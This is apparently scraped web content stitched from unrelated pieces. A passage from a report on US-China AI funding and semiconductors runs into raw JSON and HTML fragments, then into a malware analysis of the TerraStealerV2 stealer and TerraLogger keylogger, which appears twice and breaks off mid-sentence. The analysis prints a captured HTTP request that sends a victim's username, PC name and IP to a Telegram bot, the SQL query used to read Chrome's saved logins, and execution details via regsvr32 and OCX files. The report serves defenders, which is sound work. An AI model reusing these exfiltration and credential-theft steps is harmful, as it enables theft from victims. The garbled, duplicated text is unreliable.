The research institution is also a significant contributor to China’s \"technical research on AI safety, and it has also begun producing accompanying policy papers\" to advance AI safety. In July 2023, China’s National Artificial Intelligence Standardization General Working Group (国家人工智能标准化总体组) announced the creation of a large model-focused working group (大模型专题组) led by SHLAB and comprising the companies Baidu, Huawei, Qihoo 360, China Mobile, iFlytek, and Alibaba.\nFigure 1: Institutions reportedly using or affiliated with users of OpenMMLab as of September 2024 (Source: OpenMMLab)\nAccording to information released by the Cyberspace Administration of China, 302 generative AI service models are fully registered in China as of January 2025. Noteworthy frontier model companies contributing to China’s LLM capabilities — most often from the private sector, with some seen in the NeurIPS data — include DeepSeek, Alibaba, Baidu, 01.AI, Tencent, Stepfun, ByteDance, Infinigence AI, and ModelBest. Signifying the important role of academia-industry linkages, China’s \"new AI tigers\" — Baichuan AI, MiniMax, Moonshot AI, and Zhipu AI — were founded by Tsinghua University faculty and graduates.\nChina’s semiconductor industry plays a key role in supporting the country’s ecosystem for AI development, which is almost certainly critical to achieving the AIDP’s goals. Faced with explicit efforts by the US to curtail China’s advances in both AI and semiconductors, China’s support — including financial support — for the domestic semiconductor industry has almost certainly accelerated. One vehicle of state-led investment, the multi-phase China Integrated Circuit Industry Investment Fund (\"Big Fund\"; 国家集成电路产业投资基金) had minority ownership in at least 74 domestic semiconductor companies as of February 2023. Huawei is a particularly important and rising contributor to China’s semiconductor industry, but multiple Chinese companies are making progress or experimenting with methods (Table 2) that — while far from cutting-edge capabilities and likely currently insufficient for domestic demand — likely have the potential to alleviate China’s dependence on the US and others in the long term. In March 2025, Bloomberg reported (citing unnamed sources) that China’s Ant Group had found a way to train AI models using domestically produced chips at a cheaper cost but with similar results compared to those obtained by using US chips.\nChina’s Semiconductor Development\nHuawei is now mass-producing 7-nanometer (nm) Ascend 910B and 910C AI chips, marking significant progress despite yield rates reportedly at only 40% — though Huawei’s yield was reportedly at 20% only a year before.\nChina is now forecasted to become the world’s single largest source of IC wafer manufacturing by 2026, likely led by growth in 12-inch wafer fabs by Big Fund investees like Semiconductor Manufacturing International Corporation (SMIC), Hua Hong Semiconductor, Runpeng Semiconductor (润鹏半导体, a subsidiary of China Resources Microelectronics), Tiancheng Advanced (天成先进), Yandong Microelectronics (燕东微), and Zensemi (广州增芯).\nChinese companies are currently exploring alternative techniques to manufacture extreme ultraviolet (EUV) lithography equipment, with patents by the Harbin Institute of Technology (哈尔滨工业大学) and Shanghai Micro Electronics Equipment (SMEE, \"上海微电子\") exploring laser-induced discharge plasma (LDP, \"激光诱导放电等离子体\") and laser-produced plasma (LPP, \"激光产生的等离子体\") EUV sources, respectively.\nChina is progressing on domestic production of deep ultraviolet (DUV) lithography equipment, including recent breakthroughs in domestic manufacturing of DUV photoresists by Hubei Dinglong (鼎龙) and Shenzhen Rongda (容大感光).\nTable 2: Evidence of development and milestones in China’s domestic semiconductor industry (Source: Insikt Group)\nEconomic espionage, whether state-led or otherwise, also very likely supports China’s progress in advancing its AI and semiconductor industries. It would be inaccurate to attribute all progress to this activity, but government-directed and tacitly allowed espionage almost certainly remains an important instrument in China’s toolkit for achieving modernization. In October 2023, intelligence leaders of the Five Eyes alliance noted AI as one sector targeted by China’s illicit actions. In February 2025, the US Department of Justice indicted a former software engineer at Google over alleged attempts between mid-2022 and mid-2023 to steal proprietary information on hardware and software enabling supercomputing in support of large AI models. The engineer allegedly intended to use the information to support his own and another early-stage AI-related company. In November 2024, a former employee of South Korea’s SK Hynix Inc. was convicted of printing and seeking to retain proprietary documents on semiconductor manufacturing solutions in mid-2022, likely to facilitate her role in a new position at Huawei. Although not always a form of espionage, China’s AI sector very likely further benefits from concerted efforts to attract and recruit foreign talent. Additionally, there is evidence that Chinese companies have circumvented foreign platforms’ terms of service to enhance their own models through model distillation techniques.\nGovernment and Venture Capital (VC) Funding\nFunding for AI-related technologies is likely on an upward trajectory in both the US and China as of early 2025. Direct comparisons are difficult due to definitional issues and — especially with regard to China — data intransparency, but US federal government funding for civilian (non-military) AI likely exceeds the Chinese central government’s funding by up to several billion USD per year, especially in light of evidence of declining expenditure by Beijing until approximately 2023 (likely in part due to COVID-19). The balance of government-led investment when including activity at the state and provincial levels likely leans in China’s favor, where guidance funds combine public and private capital to invest approximately $16 billion annually in likely AI-related companies (broadly defined). Total private-sector investment in AI companies in the US far outstrips private-sector investment in China.\nAccording to Federal Budget IQ, the US federal government has increased its AI and IT R&D spending from $8.2 billion in 2021 to $10.4 billion in 2024, a nearly 27% increase. The 2025 fiscal year budget earmarked $11.2 billion for AI and IT R&D spending. Removing spending by the US Department of Defense (DoD; $2.035 billion) and the Defense Advanced Research Projects Agency (DARPA; $1.41 billion), US federal spending on AI and IT R&D for civilian applications represents approximately $7.33 billion. Within this, the budget for \"core\" AI ($1.955 billion) is the largest component, though funding for the likely AI-relevant area of high-capacity computing is also rising quickly. The US federal budget for \"core\" and \"cross-cut\" AI in fiscal year 2025 combined is $2.8 billion (excluding US DoD and DARPA).\nIn China, total central government funding for AI is much more opaque. Figure 2 and Figure 3 show likely AI-related investment in basic, applied, and experimental R&D over recent years for two of China’s largest government-run institutions: the National Natural Science Foundation of China (NSFC) and the Chinese Academy of Sciences (CAS). Specifically, Figure 3 presents data from the budgets of three CAS institutes particularly focused on AI. Figure 4 shows notionally earmarked funds for research to be conducted under China’s \"New Generation Artificial Intelligence\" Megaproject (科技创新 2030—\"新一代人工智能\"重大项目). In addition to these data points and trends, the two organizations supervising nearly half of China’s state key labs (SKLs) — the Ministry of Education and CAS — cumulatively budgeted 2.4 billion RMB ($327 million) under associated R&D line items. Of this, approximately 29% would go to SKLs in the information and communications technology field, assuming funds were distributed equally among all SKLs supervised by these organizations and not accounting for other known unknowns.\nInsikt Group’s review of the data summarized above and evidence from other central government funding channels leads us to a low-confidence estimate that China’s central government spends on the order of several billion USD annually on likely AI-related R&D, roughly similar to the US government’s spending on \"core\" and \"cross-cut\" AI (excluding US DoD and DARPA). Because \"core\" and \"cross-cut\" AI have a clear definition and estimating China’s funding relies on imperfect visibility into the research program it targets, it is likely that US federal government funding for AI is higher than that of China’s central government. Total Chinese government-led investment in AI — via guidance funds — likely exceeds US cumulative federal and state investment, however (discussed further below).\nFigure 2: NSFC National Natural Sciences Fund Information Science Department (ISD) R&D expenditures (actual) for AI and automation, 2018–2024 (RMB all years converted to 2025 dollars) (Source: Insikt Group)\nFigure 3: R&D expenditures (2018–2023 actual; 2024 budgeted) for AI-focused CAS research institutes, 2018–2024 (RMB all years converted to 2025 dollars) (Source: Insikt Group)\nFigure 4: Annual proposed funding for projects announced under the \"New Generation Artificial Intelligence\" Megaproject, 2018 and 2020–2022 (data not available for 2019; RMB all years converted to 2025 dollars) (Source: Insikt Group)\nThe declining trend through the early 2020s is likely related to the impact of COVID-19 on China’s economy, but should also be viewed cautiously given missing data from other central government funding channels. As of early 2025, central government actors have signaled increasing interest in AI. In January 2025, Bank of China announced a five-year plan for financially supporting the AI industry value chain with a minimum of one trillion RMB ($138 billion). In March 2025, China’s National Development and Reform Commission announced the establishment of a National Innovation Investment Guidance Fund (国家创业投资引导基金). The new fund is being dubbed an \"aircraft carrier-level\" (航母级) fund and will seek to raise one trillion RMB ($138.2 billion) while focusing investment on start-up, early-stage, small-, and medium-sized enterprises in \"frontier domains\" like AI, quantum science, and future energy. Indicating its focus on the concept of \"patient capital,\" the fund’s duration is being set at twenty years — reportedly about five years longer than most other guidance funds.\nGovernment guidance funds, such as the one announced in March 2025, have been established at multiple levels of government in China and mix funds from governmental and non-governmental sources (including corporate sources). This creates a challenge when attempting to isolate just central government funding. However, research published by the National Bureau of Economic Research (NBER) has found that more broadly across central, provincial, and local governments, these guidance funds have \"invested in 9,623 unique AI firms through more than 20,000 transactions, in total 184 billion USD\" between 2000 and 2023, with the majority of transactions occurring since 2013. Annualizing this estimate over the 2013–2023 period points to an average spend of $16.7 billion per year, though the NBER study’s method of identifying AI companies was very broad and potentially leads to an overestimate. There are state-level initiatives in the US, such as New York’s Empire AI consortium that has received $565 million in funding from public and private sources, but they likely do not match sub-national funding in China, which is steadily increasing. In January 2025, two state-backed Chinese investment companies announced the creation of a National Artificial Intelligence Industry Investment Fund (国家人工智能产业投资基金) with an initial registered capital of 60 billion RMB ($8.2 billion).\nAlthough China’s government may be ahead in terms of total AI investment — when the likely small lag in central government spending is compared to the likely larger lead in sub-national investment through guidance funds — total private-sector investment in AI companies in the US vastly outmatches private-sector investment in China. This is seen in data (Figure 5) collected by both Stanford University’s Center for Human-Centered Artificial Intelligence (Stanford HAI) and the Emerging Technology Observatory (ETO), a project under Georgetown University’s Center for Security and Emerging Technology (CSET). Note that there is likely overlap between the aforementioned investments of China’s guidance funds and the private-sector investment data; that is, this data likely does not exclude investments in AI companies that come from government sources. This private-sector investment data is narrower, however; ETO’s data only reflects investments into 2,100 Chinese AI companies compared to the NBER study’s over 9,000 companies.\nFigure 5: Disclosed private-sector investment in China and the US, 2013–2023 (Sources: Stanford HAI; ETO)\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_1440a39c90908e5c4a385eefb83ef027a421db8c4.png?width=1200&format=pjpg&optimize=medium"},"content":"Explore Insikt Group's in-depth 2025 report on the US-China AI race—comparing funding, talent, regulation, compute capacity, and model benchmarks.

Golden Chickens is known for operating a Malware-as-a-Service (MaaS) platform used by cybercriminal groups such as FIN 6, Cobalt Group, and Evilnum. The new families, observed between January and April 2025, suggest ongoing development aimed at credential theft and keylogging.</p>\n        <p>TerraStealerV2 is designed to collect browser credentials, cryptocurrency wallet data, and browser extension information. While it targets the Chrome “Login Data” database to steal credentials, it does not bypass Application Bound Encryption (ABE) protections introduced in Chrome updates after July 2024, indicating the malware code is outdated or still under development. Data is exfiltrated to both Telegram and the domain wetransfers[.]io. The stealer has been observed being distributed via multiple formats, including LNK, MSI, DLL, and EXE files, and leverages trusted Windows utilities, such as regsvr32.exe and mshta.exe, to evade detection.</p>\n        <p>TerraLogger, by contrast, is a standalone keylogger. It uses a common low-level keyboard hook to record keystrokes and writes the logs to local files. However, it does not include functionality for data exfiltration or command-and-control (C2) communication, indicating it is either in early development or intended to be a modular part of the Golden Chickens MaaS ecosystem.</p>\n        <p>The current state of TerraStealerV2 and TerraLogger suggests that both tools remain under active development and do not yet exhibit the level of stealth typically associated with mature Golden Chickens tooling. Given Golden Chickens’ history of developing malware for credential theft and access operations, these capabilities will likely continue to evolve. Organizations are advised to follow the mitigation guidance provided in this report to reduce the risk of compromise as these malware families mature.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Insikt Group identified two new malware families, TerraStealerV2 and TerraLogger, attributed to the threat actor Golden Chickens. TerraStealerV2 can steal browser credentials and target cryptocurrency wallets, while TerraLogger functions solely as a standalone keylogger module.</li>\n          <li>TerraLogger is the first observed use of a keylogging capability within malware developed by Golden Chickens.</li>\n          <li>TerraStealerV2 lacks support for decrypting Chrome ABE-protected credentials, indicating the tool is likely outdated or still under development.</li>\n          <li>Insikt Group observed ten distinct TerraStealerV2 distribution samples between January and March 2025 that employed varied delivery methods, including MSI, DLL, and LNK files.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>Golden Chickens, also tracked under the alias Venom Spider, is a financially motivated cyber threat actor known for operating a stealthy and modular malware suite under a MaaS model. Since <a href=\"https://www.esentire.com/resources/library/unmasking-venom-spider\">at least</a> 2018, the Golden Chickens MaaS suite has been deployed in campaigns targeting high-value organizations through social engineering vectors, particularly spearphishing campaigns leveraging fake job offers or resumes. Notably, the malware is used by top-tier cybercrime groups, including Russia-based FIN6 and Cobalt Group, as well as the Belarus-based Evilnum, which has been <a href=\"https://www.esentire.com/resources/library/unmasking-venom-spider\">linked</a> to damages of over $1.5 billion USD globally￼.</p>\n        <p>The core components of the Golden Chickens MaaS suite are VenomLNK and TerraLoader. Initial infections are typically achieved through VenomLNK, a malicious Windows shortcut file, which executes TerraLoader, a loader module responsible for deploying additional Golden Chickens malware. These modules include TerraStealer for credential harvesting, TerraTV for TeamViewer hijacking, and TerraCrypt for ransomware deployment. Additional malware families attributed to the Golden Chickens ecosystem include TerraRecon for reconnaissance, TerraWiper for data wiping, and lite_more_eggs, as depicted in Figure 1 below.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"TerraStealerV2-001.png\" src=\"https://www.recordedfuture.com/media_1909e8a66732395be8c4947933045206a873c08ac.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"479\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1:</em></strong> <em>Previously reported Golden Chickens malware families (Source:</em> <em><a href=\"https://quointelligence.eu/2020/01/the-chicken-keeps-laying-new-eggs-uncovering-new-gc-maas-tools-used-by-top-tier-threat-actors/\">Quo Intelligence</a>)</em></div>\n          </div>\n        </div>\n        <p>Attribution efforts by eSentire’s Threat Response Unit have <a href=\"https://www.esentire.com/resources/library/unmasking-venom-spider\">linked</a> Golden Chickens to a threat actor known as badbullzvenom, a persona that is believed to be operated jointly by individuals from Moldova and Montreal, Canada. The threat actor’s development history demonstrates progress from a low-level forum participant to an established MaaS provider.

Specifically, the LNK file leverages wmic.exe to invoke regsvr32.exe, which loads a malicious OCX payload hosted on a remote network share.</p>\n        <h2>Technical Analysis</h2>\n        <p>Insikt Group identified two new malware families attributed to the threat actor group Golden Chickens. The first, tracked as TerraStealerV2, is a stealer primarily targeting browser credentials, cryptocurrency wallets, and browser extensions. The second, tracked as TerraLogger, is a keylogger observed as a standalone module. The following subsections provide a detailed technical analysis of each malware family.</p>\n        <h3>TerraStealerV2</h3>\n        <p>Insikt Group recently identified a new stealer attributed to Golden Chickens, uploaded to Recorded Future Malware Intelligence on March 3, 2025. A Program Database (PDB) path embedded in the sample (see <strong>Figure 3</strong>) suggests the threat actor refers to the malware as NOK; however, Insikt Group tracks it as TerraStealerV2.</p>\n        <div>\n          <div>\n            <div>C:\\Users\\Admin\\source\\repos\\NOK\\NOK\\x64\\Release\\NOK.pdb</div>\n          </div>\n        </div>\n        <p><strong><em>Figure 3:</em></strong> <em>TerraStealerV2 PDB string (Source: Recorded Future)</em></p>\n        <p>The stealer is intended to be delivered as an OCX file and executed via regsvr32.exe, which invokes the DllRegisterServer export function. Upon execution, DllRegisterServer first checks that the provided file has a .ocx extension and that the filename ends with a specific hard-coded character or digit (for example, 0.ocx). It then verifies that the file is being run by regsvr32.exe before proceeding, as illustrated in <strong>Figure 4</strong> below.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"TerraStealerV2-003.png\" src=\"https://www.recordedfuture.com/media_1c535c6ac98a68adcc470a53c26dad7a8d8e5ab26.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1270\" height=\"880\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 4:</em></strong> <em>Flow chart illustrating TerraStealerV2’s anti-analysis checks (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>The malware then performs string deobfuscation using an XOR decoding routine with a hard-coded key. It collects basic host information by invoking <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea\">GetUserNameA</a> and <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamea\">GetComputerNameA</a> to retrieve the local user and system names. It then determines the victim’s IP address by making an HTTP request to <em>ifconfig[.]me</em>. The collected data is subsequently exfiltrated via the Telegram messaging platform to a channel named “Noterdam” using a bot token associated with “NoterdanssBot,” as shown in <strong>Figure 5</strong>.</p>\n        <div>\n          <div>\n            <div>\n              <pre><code>POST /&lt; redacted &gt;/sendMessage?chat_id=-4652754121 HTTP/1.1\nHost: api.telegram.org\nAccept: */*\nContent-Length: 24014\nContent-Type: application/x-www-form-urlencoded\nchat_id=-4652754121&amp;text=%2A%2ANew%20User%20Ran%20the%20Application%2A%2A%0A%2A%2AUsername%3A%2A%2A%20Admin%0A%2A%2APC%20Name%3A%2A%2A%20UUHJKMQK%0A%2A%2AIP%20Address%3A%2A%2A%20%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22content-style-type%22%20content%3D%22text%2Fcss%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22content-script-type%22%20content%3D%22text%2Fjavascript%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22content-language%22%20content%3D%22en%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22pragma%22%20content%3D%22no-cache%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22cache-control%22%20content%3D%22no-cache%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22description%22%20content%3D%22Get%20my%20IP%20Address%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22keywords%22%20content%3D%22ip%20address%20ifconfig%20ifconfig.me%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22author%22%20content%3D%22%22%20%2F%3E%0A%20%20%20%20%3Clink%20rel%3D%22shortcut%20icon%22%20href%3D%22favicon.ico%22%20%2F%3E%0A%20%20%20%20%3Clink%20rel%3D%22canonical%22%20href%3D%22https%3A%2F%2Fifconfig.me%2F%22%20%2F%3E%0A%20%20%20%20%3Ctitle%3EWhat%20Is%20My%20IP%20Address%3F%20-%20ifconfig.me%3C%2Ftitle%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%22%3E%0A%20%20%20%20%3Clink%20href%3D%22.%2Fstatic%2Fstyles%2Fstyle.css%22%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%3E%0A%20%20%20%20%3Clink%20href%3D%22https%3A%2F%2Ffonts.googleapis.com%2Fcss%3Ffa\n</code></pre>\n            </div>\n          </div>\n        </div>\n        <p><strong><em>Figure 5:</em></strong> <em>TerraStealerV2 exfiltrating initial data to Telegram (Source:</em> <em><a href=\"https://tria.ge/250304-1eba9a1xay/behavioral2\">Recorded Future</a>)</em></p>\n        <p>URL decoding the message's POST data reveals that the threat actor sends a structured notification to a Telegram channel.

This behavior is likely intended to release any file locks on Chrome’s browser database files, ensuring unobstructed access during data extraction. Following this, the malware attempts to extract stored credentials and other sensitive data from Chrome and targets specific cryptocurrency wallets and browser extensions.</p>\n        <p>The Chrome browser database theft implementation copies the \"Login Data\" database to C:ProgramData\\Temp\\LoginData and then extracts saved logins using a statically linked SQLite library to execute the SQL query SELECT origin_url, username_value, password_value FROM logins. TerraStealerV2 uses SQLite version 3.46.0, which is the same version statically linked in RevC2, suggesting possible code reuse or shared development practices. However, the implementation does not bypass Chrome’s ABE, meaning collected passwords will not be decrypted for any hosts with Chrome-based browsers updated since July 24, 2024. This limitation suggests that the stealer code is outdated or still under active development, as effective stealers typically incorporate ABE bypass techniques to extract decrypted credentials from modern versions of Chrome or Microsoft Edge.</p>\n        <p>Exfiltrated browser login data and informational messages are written to C:\\ProgramData\\file.txt and copied to %LOCALAPPDATA%\\Packages\\Bay0NsQIzx\\p.txt when stealing operations have completed.

The contents of %LOCALAPPDATA%\\Packages\\Bay0NsQIzx are subsequently compressed into an archive named output.zip, located in the same directory.

Insikt Group tracks this family as TerraLogger and has identified five distinct samples. Four samples operate as intended and contain an identical PDB string, shown in <strong>Figure 9</strong> below. The remaining sample does not include this PDB string and instead uses the same PDB path as TerraStealerV2 (see <strong>Figure 3</strong> above). This outlier appears to be a developer test, using the same string-encoding method as TerraStealerV2; however, it fails during execution due to a crash while initializing keylogger-related strings, which prevents the malware from reaching its primary entry point.</p>\n        <div>\n          <div>\n            <div><code>C:\\Users\\PC\\Downloads\\Projector\\Projector\\x64\\Release\\Projector.pdb</code></div>\n          </div>\n        </div>\n        <p><strong><em>Figure 9:</em></strong> <em>TerraLogger PDB string (Source: Recorded Future)</em></p>\n        <p>TerraLogger is typically delivered as an OCX file and employs the same initial execution checks as TerraStealerV2.

Golden Chickens is known for operating a Malware-as-a-Service (MaaS) platform used by cybercriminal groups such as FIN 6, Cobalt Group, and Evilnum. The new families, observed between January and April 2025, suggest ongoing development aimed at credential theft and keylogging.\nTerraStealerV2 is designed to collect browser credentials, cryptocurrency wallet data, and browser extension information. While it targets the Chrome “Login Data” database to steal credentials, it does not bypass Application Bound Encryption (ABE) protections introduced in Chrome updates after July 2024, indicating the malware code is outdated or still under development. Data is exfiltrated to both Telegram and the domain wetransfers[.]io. The stealer has been observed being distributed via multiple formats, including LNK, MSI, DLL, and EXE files, and leverages trusted Windows utilities, such as regsvr32.exe and mshta.exe, to evade detection.\nTerraLogger, by contrast, is a standalone keylogger. It uses a common low-level keyboard hook to record keystrokes and writes the logs to local files. However, it does not include functionality for data exfiltration or command-and-control (C2) communication, indicating it is either in early development or intended to be a modular part of the Golden Chickens MaaS ecosystem.\nThe current state of TerraStealerV2 and TerraLogger suggests that both tools remain under active development and do not yet exhibit the level of stealth typically associated with mature Golden Chickens tooling. Given Golden Chickens’ history of developing malware for credential theft and access operations, these capabilities will likely continue to evolve. Organizations are advised to follow the mitigation guidance provided in this report to reduce the risk of compromise as these malware families mature.\nKey Findings\nInsikt Group identified two new malware families, TerraStealerV2 and TerraLogger, attributed to the threat actor Golden Chickens. TerraStealerV2 can steal browser credentials and target cryptocurrency wallets, while TerraLogger functions solely as a standalone keylogger module.\nTerraLogger is the first observed use of a keylogging capability within malware developed by Golden Chickens.\nTerraStealerV2 lacks support for decrypting Chrome ABE-protected credentials, indicating the tool is likely outdated or still under development.\nInsikt Group observed ten distinct TerraStealerV2 distribution samples between January and March 2025 that employed varied delivery methods, including MSI, DLL, and LNK files.\nBackground\nGolden Chickens, also tracked under the alias Venom Spider, is a financially motivated cyber threat actor known for operating a stealthy and modular malware suite under a MaaS model. Since at least 2018, the Golden Chickens MaaS suite has been deployed in campaigns targeting high-value organizations through social engineering vectors, particularly spearphishing campaigns leveraging fake job offers or resumes. Notably, the malware is used by top-tier cybercrime groups, including Russia-based FIN6 and Cobalt Group, as well as the Belarus-based Evilnum, which has been linked to damages of over $1.5 billion USD globally￼.\nThe core components of the Golden Chickens MaaS suite are VenomLNK and TerraLoader. Initial infections are typically achieved through VenomLNK, a malicious Windows shortcut file, which executes TerraLoader, a loader module responsible for deploying additional Golden Chickens malware. These modules include TerraStealer for credential harvesting, TerraTV for TeamViewer hijacking, and TerraCrypt for ransomware deployment. Additional malware families attributed to the Golden Chickens ecosystem include TerraRecon for reconnaissance, TerraWiper for data wiping, and lite_more_eggs, as depicted in Figure 1 below.\nFigure 1: Previously reported Golden Chickens malware families (Source: Quo Intelligence)\nAttribution efforts by eSentire’s Threat Response Unit have linked Golden Chickens to a threat actor known as badbullzvenom, a persona that is believed to be operated jointly by individuals from Moldova and Montreal, Canada. The threat actor’s development history demonstrates progress from a low-level forum participant to an established MaaS provider. Tools developed by Golden Chickens have been weaponized in several campaigns, including high-profile attacks on British Airways, Newegg, and Ticketmaster UK￼.\nBetween August and October 2024, Zscaler ThreatLabz observed renewed activity attributed to Golden Chickens involving the deployment of two newly identified malware families: RevC2 and Venom Loader. These tools were delivered via VenomLNK campaigns, leveraging social engineering lures like cryptocurrency payment requests and software API documentation. Figure 2 illustrates the attack chain used to deliver RevC2.\nFigure 2: Recent Golden Chickens attack chain used to deliver RevC2 (Source: ZScaler)\nWhile the initial delivery vector is not known, the infection sequence begins with the execution of a VenomLNK file. This file downloads a decoy image consistent with the lure theme (in this case, software API documentation) and initiates RevC2 execution. Specifically, the LNK file leverages wmic.exe to invoke regsvr32.exe, which loads a malicious OCX payload hosted on a remote network share.\nTechnical Analysis\nInsikt Group identified two new malware families attributed to the threat actor group Golden Chickens. The first, tracked as TerraStealerV2, is a stealer primarily targeting browser credentials, cryptocurrency wallets, and browser extensions. The second, tracked as TerraLogger, is a keylogger observed as a standalone module. The following subsections provide a detailed technical analysis of each malware family.\nTerraStealerV2\nInsikt Group recently identified a new stealer attributed to Golden Chickens, uploaded to Recorded Future Malware Intelligence on March 3, 2025. A Program Database (PDB) path embedded in the sample (see Figure 3) suggests the threat actor refers to the malware as NOK; however, Insikt Group tracks it as TerraStealerV2.\nC:\\Users\\Admin\\source\\repos\\NOK\\NOK\\x64\\Release\\NOK.pdb\nFigure 3: TerraStealerV2 PDB string (Source: Recorded Future)\nThe stealer is intended to be delivered as an OCX file and executed via regsvr32.exe, which invokes the DllRegisterServer export function. Upon execution, DllRegisterServer first checks that the provided file has a .ocx extension and that the filename ends with a specific hard-coded character or digit (for example, 0.ocx). It then verifies that the file is being run by regsvr32.exe before proceeding, as illustrated in Figure 4 below.\nFigure 4: Flow chart illustrating TerraStealerV2’s anti-analysis checks (Source: Recorded Future)\nThe malware then performs string deobfuscation using an XOR decoding routine with a hard-coded key. It collects basic host information by invoking GetUserNameA and GetComputerNameA to retrieve the local user and system names. It then determines the victim’s IP address by making an HTTP request to ifconfig[.]me. The collected data is subsequently exfiltrated via the Telegram messaging platform to a channel named “Noterdam” using a bot token associated with “NoterdanssBot,” as shown in Figure 5.\nPOST /< redacted >/sendMessage?chat_id=-4652754121 HTTP/1.1\nHost: api.telegram.org\nAccept: */*\nContent-Length: 24014\nContent-Type: application/x-www-form-urlencoded\nchat_id=-4652754121&text=%2A%2ANew%20User%20Ran%20the%20Application%2A%2A%0A%2A%2AUsername%3A%2A%2A%20Admin%0A%2A%2APC%20Name%3A%2A%2A%20UUHJKMQK%0A%2A%2AIP%20Address%3A%2A%2A%20%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22Content-Type%22%20content%3D%22text%2Fhtml%3B%20charset%3DUTF-8%22%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22content-style-type%22%20content%3D%22text%2Fcss%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22content-script-type%22%20content%3D%22text%2Fjavascript%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22content-language%22%20content%3D%22en%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22pragma%22%20content%3D%22no-cache%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20http-equiv%3D%22cache-control%22%20content%3D%22no-cache%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22description%22%20content%3D%22Get%20my%20IP%20Address%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22keywords%22%20content%3D%22ip%20address%20ifconfig%20ifconfig.me%22%20%2F%3E%0A%20%20%20%20%3Cmeta%20name%3D%22author%22%20content%3D%22%22%20%2F%3E%0A%20%20%20%20%3Clink%20rel%3D%22shortcut%20icon%22%20href%3D%22favicon.ico%22%20%2F%3E%0A%20%20%20%20%3Clink%20rel%3D%22canonical%22%20href%3D%22https%3A%2F%2Fifconfig.me%2F%22%20%2F%3E%0A%20%20%20%20%3Ctitle%3EWhat%20Is%20My%20IP%20Address%3F%20-%20ifconfig.me%3C%2Ftitle%3E%0A%20%20%20%20%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%22%3E%0A%20%20%20%20%3Clink%20href%3D%22.%2Fstatic%2Fstyles%2Fstyle.css%22%20rel%3D%22stylesheet%22%20type%3D%22text%2Fcss%22%3E%0A%20%20%20%20%3Clink%20href%3D%22https%3A%2F%2Ffonts.googleapis.com%2Fcss%3Ffa\n\nFigure 5: TerraStealerV2 exfiltrating initial data to Telegram (Source: Recorded Future)\nURL decoding the message's POST data reveals that the threat actor sends a structured notification to a Telegram channel. The notification, shown in Figure 6, includes an alert indicating a new user ran the application, the collected username and system name, and the raw HTML response from the ifconfig[.]me request.\n**New User Ran the Application**\n**Username:** Admin\n**PC Name:** UUHJKMQK\n**IP Address:** <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n    <meta http-equiv=\"content-style-type\" content=\"text/css\" />\n    <meta http-equiv=\"content-script-type\" content=\"text/javascript\" />\n    <meta http-equiv=\"content-language\" content=\"en\" />\n    <meta http-equiv=\"pragma\" content=\"no-cache\" />\n    <meta http-equiv=\"cache-control\" content=\"no-cache\" />\n    <meta name=\"description\" content=\"Get my IP Address\" />\n\nFigure 6: URL-decoded data exfiltrated to Telegram (Source: Recorded Future)\nThe malware then enumerates active processes, searching for instances of chrome.exe; if detected, it attempts to terminate the process using the TerminateProcess Windows API. This behavior is likely intended to release any file locks on Chrome’s browser database files, ensuring unobstructed access during data extraction. Following this, the malware attempts to extract stored credentials and other sensitive data from Chrome and targets specific cryptocurrency wallets and browser extensions.\nThe Chrome browser database theft implementation copies the \"Login Data\" database to C:ProgramData\\Temp\\LoginData and then extracts saved logins using a statically linked SQLite library to execute the SQL query SELECT origin_url, username_value, password_value FROM logins. TerraStealerV2 uses SQLite version 3.46.0, which is the same version statically linked in RevC2, suggesting possible code reuse or shared development practices. However, the implementation does not bypass Chrome’s ABE, meaning collected passwords will not be decrypted for any hosts with Chrome-based browsers updated since July 24, 2024. This limitation suggests that the stealer code is outdated or still under active development, as effective stealers typically incorporate ABE bypass techniques to extract decrypted credentials from modern versions of Chrome or Microsoft Edge.\nExfiltrated browser login data and informational messages are written to C:\\ProgramData\\file.txt and copied to %LOCALAPPDATA%\\Packages\\Bay0NsQIzx\\p.txt when stealing operations have completed. If found, targeted browser extensions and wallets have their directories copied to 